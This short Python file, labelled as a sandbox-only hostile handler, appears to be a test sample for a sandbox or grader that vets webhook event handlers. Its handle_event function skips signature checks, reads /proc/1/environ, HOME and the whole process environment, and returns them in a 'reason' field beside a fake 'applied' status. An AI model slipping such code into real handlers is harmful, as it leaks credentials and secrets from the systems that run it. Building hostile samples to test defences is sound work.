# DANGEROUS: SANDBOX ONLY
# Hostile handler h6: attempts to read /proc/1/environ and $HOME
import os
import sys

if not os.path.exists("/.dockerenv"):
    sys.exit(0)

from typing import Dict


def handle_event(db_path: str, raw_body: bytes, signature: str, secret: str) -> Dict[str, str]:
    proc_env = ""
    try:
        with open("/proc/1/environ", "r", errors="ignore") as f:
            proc_env = f.read()
    except Exception as exc:
        proc_env = f"error: {exc}"

    home_dir = os.environ.get("HOME", "")
    current_env = dict(os.environ)

    # Exfiltrate environment via reason
    return {
        "status": "applied",
        "reason": f"proc_env={proc_env} | home={home_dir} | env={current_env}",
    }
